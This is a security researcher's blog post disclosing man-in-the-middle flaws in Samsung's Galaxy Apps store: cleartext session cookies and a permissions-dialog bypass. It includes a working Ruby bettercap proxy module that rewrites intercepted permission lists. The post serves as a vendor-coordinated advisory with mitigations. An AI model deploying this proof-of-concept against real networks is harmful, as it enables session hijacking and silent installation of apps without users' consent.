<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta http-equiv="X-UA-Compatible" content="IE=edge">

<title>Samsung Galaxy Apps MITM Vulnerabilities | evilsocket</title>
<meta name="description" content="The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart wa">


  <link rel="alternate" href="/atom.xml" title="evilsocket" type="application/atom+xml">


<link rel="icon" href="/images/favicon.ico">

<!-- Open Graph -->
<meta property="og:type" content="article">
<meta property="og:title" content="Samsung Galaxy Apps MITM Vulnerabilities">
<meta property="og:description" content="The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart wa">
<meta property="og:url" content="/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/">
<meta property="og:site_name" content="evilsocket">

  
  
    <meta property="og:image" content="/images/2016/08/galaxyapps.png">
  


<!-- Twitter Card -->
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:title" content="Samsung Galaxy Apps MITM Vulnerabilities">
<meta name="twitter:description" content="The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart wa">

<!-- Schema.org JSON-LD -->


<script type="application/ld+json">
{"@context":"https://schema.org","@type":"Article","mainEntityOfPage":{"@type":"WebPage","@id":"https://www.evilsocket.net/2016/08/17/Samsung-Galaxy-Apps-MITM-Vulnerabilities/"},"headline":"Samsung Galaxy Apps MITM Vulnerabilities","description":"The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart wa","image":"https://www.evilsocket.net/images/2016/08/galaxyapps.png","datePublished":"2016-08-17T10:01:42.000Z","dateModified":"2021-03-01T18:09:08.000Z","author":{"@type":"Person","name":"Simone Margaritelli","description":"Italian cybersecurity researcher and open-source developer","url":"https://www.evilsocket.net","sameAs":["https://github.com/evilsocket","https://twitter.com/evilsocket","http://it.linkedin.com/in/simonemargaritelli/"],"jobTitle":"Security Researcher","worksFor":{"@type":"Organization","name":"Independent"}},"publisher":{"@type":"Organization","name":"evilsocket","url":"https://www.evilsocket.net","logo":{"@type":"ImageObject","url":"https://www.evilsocket.net/images/glider.png"}},"keywords":"mitm, man in the middle, session hijacking, permission bypass, samsung, samsung galaxy apps, galaxy","articleSection":"Technology","inLanguage":"en"}
</script>


<!-- Fonts -->
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">

<!-- Styles -->
<link rel="stylesheet" href="/css/style.css">


<!-- Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-22026549-1"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'UA-22026549-1');
</script>


<meta name="generator" content="Hexo 5.4.2"></head>
<body class="post-page">
  <header class="site-header">
  <div class="header-inner">
    <div class="site-branding">
      <a href="/" class="site-logo">
        
          <img src="/images/glider.png" alt="evilsocket" width="50" height="50">
        
        <span class="site-title">evilsocket</span>
      </a>
    </div>
    
    <nav class="site-nav">
      
        <a href="/" class="nav-link">
          HOME
        </a>
      
        <a href="/atom.xml" class="nav-link">
          RSS
        </a>
      
    </nav>
  </div>
</header>

  
  <main class="main-content">
    <article class="post-full">
  <header class="post-header">
    <h1 class="post-title">Samsung Galaxy Apps MITM Vulnerabilities</h1>
    <div class="post-meta">
      BY <span class="post-author">Simone Margaritelli</span>
      — <time datetime="2016-08-17T10:01:42.000Z">17 Aug 2016</time>
      
        — <a href="/tags/mitm/" class="post-category">mitm</a>, <a href="/tags/man-in-the-middle/" class="post-category">man in the middle</a>, <a href="/tags/session-hijacking/" class="post-category">session hijacking</a>, <a href="/tags/permission-bypass/" class="post-category">permission bypass</a>, <a href="/tags/samsung/" class="post-category">samsung</a>, <a href="/tags/samsung-galaxy-apps/" class="post-category">samsung galaxy apps</a>, <a href="/tags/galaxy/" class="post-category">galaxy</a>
      
    </div>
  </header>

  
  
    <div class="post-cover">
      <img src="/images/2016/08/galaxyapps.png" alt="Samsung Galaxy Apps MITM Vulnerabilities">
    </div>
  

  <div class="post-content">
    <p>The Samsung “Galaxy Apps” application installed on every recent Samsung device, a parallel store application with both apps for Samsung smartphones and smart watches, is vulnerable to MITM attacks which could cause user information leaks, permissions dialog bypass and session hijacking.</p>
<h4 id="Affected-Products"><a href="#Affected-Products" class="headerlink" title="Affected Products"></a>Affected Products</h4><p>Samsung Galaxy Apps &lt;= 4.1.01-14</p>
<p><img src="/images/2016/08/galaxyapps.png" alt="galaxy apps"></p>
<span id="more"></span>

<p>## MITM, Information Leaks and Session Hijacking</p>
<h4 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h4><p>Most of the application API requests are made through a unsafe HTTP connection which would allow a malicious third party to perform a network MITM attack and eventually exfiltrate user sensitive data such as his session identifier and subsequently use this data to impersonate the user session.</p>
<h4 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h4><p>The application relies on a XML based API used through HTTP, as soon as the user will open the app and start browsing a network attacker will be able to see requests sent to the API server and the user session data, for instance the first request being executed when the user clicks on an application detail page, identified by the name <strong>productDetailOverview</strong> is composed as shown in the following picture.</p>
<p><img src="/images/2016/08/productDetailOverview.png" alt="galaxy apps"></p>
<p>The XML response will contain application data such as the creation date, last update date, product name and description, etc.</p>
<p>It is possible to see that the user session cookies ( <strong>UUID</strong> and <strong>JSESSIONID</strong> ) are sent in cleartext, therefore they can be used by an attacker to impersonate the user and perform API requests on his behalf.</p>
<p>Other XML request names sent during application browsing and installation are:</p>
<ul>
<li><strong>bigBannerList</strong>, used to obtain application preview images.</li>
<li><strong>expertCommentList</strong> and commentList, these fetch comments for an app.</li>
<li><strong>productDetailRelated</strong>, fetches related applications list.</li>
<li><strong>categoryProductList2Notc</strong>, fetches products in the same category.</li>
<li><strong>sellerProductList2Notc</strong>, fetches other products of the same vendor.</li>
<li><strong>androidManifestList</strong>, fetches the list of permissions required by the application before installing it ( more on this later ).</li>
</ul>
<h4 id="Impact"><a href="#Impact" class="headerlink" title="Impact"></a>Impact</h4><ul>
<li>User Impersonation - An attacker could use the exfiltrated session data to authenticate against the API server on the user’s behalf.</li>
<li>Contents Manipulation - With a transparent proxy and proper redirection rules, an attacker could intercept and modify the XML responses before they’re received by the application, this would allow him to replace product images, names and descriptions with fake ones.</li>
</ul>
<h2 id="Permissions-Dialog-Bypass"><a href="#Permissions-Dialog-Bypass" class="headerlink" title="Permissions Dialog Bypass"></a>Permissions Dialog Bypass</h2><h4 id="Summary-1"><a href="#Summary-1" class="headerlink" title="Summary"></a>Summary</h4><p>It is possible for an attacker performing a MITM network attack to intercept and modify the XML response of the <strong>androidManifestList</strong> request and force the product to install an application without showing to the user the permission list dialog which would require his approval.</p>
<h4 id="Details-1"><a href="#Details-1" class="headerlink" title="Details"></a>Details</h4><p>Once the user clicks on the “Install” button, an <strong>androidManifestList</strong> request is sent to the API endpoint in order to fetch the list of permissions that the application requires:</p>
<p><img src="/images/2016/08/androidManifestList.png" alt="galaxy apps"></p>
<p>As shown in this picture, the response will contain the list of permissions separated by a double pipe ( “||” ) token.</p>
<p>This list is then splitted by the application and the user is prompted with a dialog which shows him the required permissions, the installation process requires the user to accept all of them in order to successfully continue.</p>
<p><img src="/images/2016/08/mail.png" alt="galaxy apps"></p>
<p>An attacker performing a MITM network attack can intercept and modify the XML response for this API before it’s sent to the device and replace the permissions list with a single <strong>INTERNET</strong> permission entry, in this case the Samsung Galaxy Apps store will directly install the application without showing the user any dialog at all.</p>
<p>The following is a POC bettercap proxy module.</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">=begin</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">BETTERCAP</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Author : Simone &#x27;evilsocket&#x27; Margaritelli</span></span><br><span class="line"><span class="comment">Email  : evilsocket<span class="doctag">@gmail</span>.com</span></span><br><span class="line"><span class="comment">Blog   : http://www.evilsocket.net/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">This project is released under the GPL 3 license.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">=end</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GalaxyApps</span> &lt; BetterCap::Proxy::<span class="title">HTTP::Module</span></span></span><br><span class="line">  meta(</span><br><span class="line">    <span class="string">&#x27;Name&#x27;</span>        =&gt; <span class="string">&#x27;GalaxyApps&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Description&#x27;</span> =&gt; <span class="string">&#x27;Bypass permission dialog for &quot;Galaxy Apps&quot; application on every Samsung device.&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Version&#x27;</span>     =&gt; <span class="string">&#x27;1.0.0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Author&#x27;</span>      =&gt; <span class="string">&quot;Simone &#x27;evilsocket&#x27; Margaritelli&quot;</span>,</span><br><span class="line">    <span class="string">&#x27;License&#x27;</span>     =&gt; <span class="string">&#x27;GPL3&#x27;</span></span><br><span class="line">  )</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">on_request</span><span class="params">( request, response )</span></span></span><br><span class="line">    <span class="keyword">if</span> !request.body.<span class="literal">nil</span>? <span class="keyword">and</span> request.body.<span class="keyword">include</span>?(<span class="string">&#x27;&lt;SamsungProtocol&#x27;</span>)</span><br><span class="line">      req_name = <span class="string">&#x27;???&#x27;</span></span><br><span class="line">      <span class="keyword">if</span> request.body =~ <span class="regexp">/.+&lt;request\s+name=&quot;([^&quot;]+)&quot;/i</span></span><br><span class="line">        req_name = $<span class="number">1</span></span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line"></span><br><span class="line">      BetterCap::Logger.info <span class="string">&quot;[<span class="subst">#&#123;<span class="string">&#x27;GALAXY APPS&#x27;</span>.green&#125;</span>] Detected Galaxy Apps traffic: <span class="subst">#&#123;<span class="string">&#x27;request&#x27;</span>.blue&#125;</span>=&#x27;<span class="subst">#&#123;req_name.yellow&#125;</span>&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> req_name == <span class="string">&#x27;androidManifestList&#x27;</span></span><br><span class="line">        response.body.gsub!( <span class="regexp">/permission&quot;&gt;[^&lt;]+&lt;/i</span>, <span class="string">&#x27;permission&quot;&gt;INTERNET&lt;&#x27;</span> )</span><br><span class="line">      <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">  <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure>

<h4 id="Impact-1"><a href="#Impact-1" class="headerlink" title="Impact"></a>Impact</h4><p>An attacker could trick the user to think that an application which requires sensitive permissions does not require any at all, thus forcing the store to install it without any kind of user manual approval.</p>
<h4 id="Mitigations-amp-Recommendations"><a href="#Mitigations-amp-Recommendations" class="headerlink" title="Mitigations &amp; Recommendations"></a>Mitigations &amp; Recommendations</h4><ul>
<li>Use HTTPS connections for every API request.</li>
<li>Implement SSL key pinning to avoid SSL MITM attacks.</li>
<li>Double check the list of permissions after the application is downloaded reading them directly from its AndroidManifest.xml file.</li>
</ul>
<h4 id="Disclosure-Timeline"><a href="#Disclosure-Timeline" class="headerlink" title="Disclosure Timeline"></a>Disclosure Timeline</h4><ul>
<li>May 2 2016 : Initial disclosure.</li>
<li>June 7 2016 : Follow up.</li>
<li>June 8 2016 : Email from vendor working on fixes.</li>
<li>June 9 2016 : Confirmation that fixes were going to be pushed in next release</li>
</ul>

  </div>

  
    <div class="post-tags">
      
        <a href="/tags/mitm/" class="tag">#mitm</a>
      
        <a href="/tags/man-in-the-middle/" class="tag">#man in the middle</a>
      
        <a href="/tags/session-hijacking/" class="tag">#session hijacking</a>
      
        <a href="/tags/permission-bypass/" class="tag">#permission bypass</a>
      
        <a href="/tags/samsung/" class="tag">#samsung</a>
      
        <a href="/tags/samsung-galaxy-apps/" class="tag">#samsung galaxy apps</a>
      
        <a href="/tags/galaxy/" class="tag">#galaxy</a>
      
    </div>
  

  <nav class="post-navigation">
    
      <a href="/2016/08/24/RCE-against-every-open-source-BTS/" class="nav-prev">
        <span class="nav-label">PREVIOUS</span>
        <span class="nav-title">DISCLOSURE - RCE Against Every Open Source BTS Software.</span>
      </a>
    
    
      <a href="/2016/07/27/How-The-United-Arab-Emirates-Intelligence-Tried-to-Hire-me-to-Spy-on-its-People/" class="nav-next">
        <span class="nav-label">NEXT</span>
        <span class="nav-title">How the United Arab Emirates Intelligence Tried to Hire Me to Spy on Its People</span>
      </a>
    
  </nav>
</article>


  


<section class="related-posts">
  <h3 class="related-title">YOU MIGHT ALSO LIKE...</h3>
  <div class="cards-grid cards-grid-related">
    
      

<article class="card card-light">
  <a href="/2018/02/27/All-hail-bettercap-2-0-one-tool-to-rule-them-all/" class="card-link">
    
      <div class="card-image" style="background-image: url('https://www.bettercap.org/img/logo.png')">
        
      </div>
    
    
    
      <div class="card-content">
        
          <span class="card-category">bettercap</span>
        
        <h2 class="card-title">All Hail Bettercap 2.0, One Tool to Rule Them All.</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2017/08/15/gpd-pocket-7-impressions-gnulinux-installation-and-offensive-setup/" class="card-link">
    
      <div class="card-image" style="background-image: url('https://pbs.twimg.com/media/DG4TXarXcAAsxSa.jpg')">
        
          <div class="card-overlay-content">
            
              <span class="card-category">bettercap</span>
            
            <h2 class="card-title">GPD Pocket 7: Impressions, GNU/Linux Installation and Offensive Setup</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-overlay">
  <a href="/2017/06/30/BetterCap-1-6-1-TLS-Server-Name-Indication-and-Why-We-Need-to-Encrypt-It/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2017/07/sni.png')">
        
          <div class="card-overlay-content">
            
              <span class="card-category">bettercap</span>
            
            <h2 class="card-title">TLS, Server Name Indication and Why We Need to Encrypt It</h2>
            <span class="card-read-more">READ MORE</span>
          </div>
        
      </div>
    
    
    
  </a>
</article>

    
      

<article class="card card-light">
  <a href="/2016/09/15/WiFi-Pineapple-NANO-OS-X-and-BetterCap-setup/" class="card-link">
    
      <div class="card-image" style="background-image: url('/images/2016/09/nano.jpg')">
        
      </div>
    
    
    
      <div class="card-content">
        
          <span class="card-category">bettercap</span>
        
        <h2 class="card-title">WiFi Pentesting With a Pineapple NANO, OS X and BetterCap</h2>
        
        <div class="card-footer">
          <span class="card-read-more">READ MORE</span>
        </div>
      </div>
    
  </a>
</article>

    
  </div>
</section>




  </main>
  
  <footer class="site-footer">
  <div class="footer-inner">
    <div class="footer-social">
      
        
          
            <a href="https://github.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="GitHub">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
            </a>
          
        
          
            <a href="https://twitter.com/evilsocket" class="social-link" target="_blank" rel="noopener" aria-label="Twitter">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
            </a>
          
        
          
            <a href="http://it.linkedin.com/in/simonemargaritelli/" class="social-link" target="_blank" rel="noopener" aria-label="LinkedIn">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="currentColor"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433c-1.144 0-2.063-.926-2.063-2.065 0-1.138.92-2.063 2.063-2.063 1.14 0 2.064.925 2.064 2.063 0 1.139-.925 2.065-2.064 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg>
            </a>
          
        
          
        
          
            <a href="mailto:evilsocket@gmail.com" class="social-link" aria-label="Email">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/><polyline points="22,6 12,13 2,6"/></svg>
            </a>
          
        
      
    </div>
    <p class="footer-copyright">
      &copy; 2025 evilsocket. 
      Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a>.
    </p>
  </div>
</footer>

  <!-- Minimal JS - no external dependencies needed -->
<script>
  // Lazy load images
  document.addEventListener('DOMContentLoaded', function() {
    var images = document.querySelectorAll('.card-image[data-bg]');
    images.forEach(function(img) {
      img.style.backgroundImage = 'url(' + img.dataset.bg + ')';
    });
  });
</script>

</body>
</html>
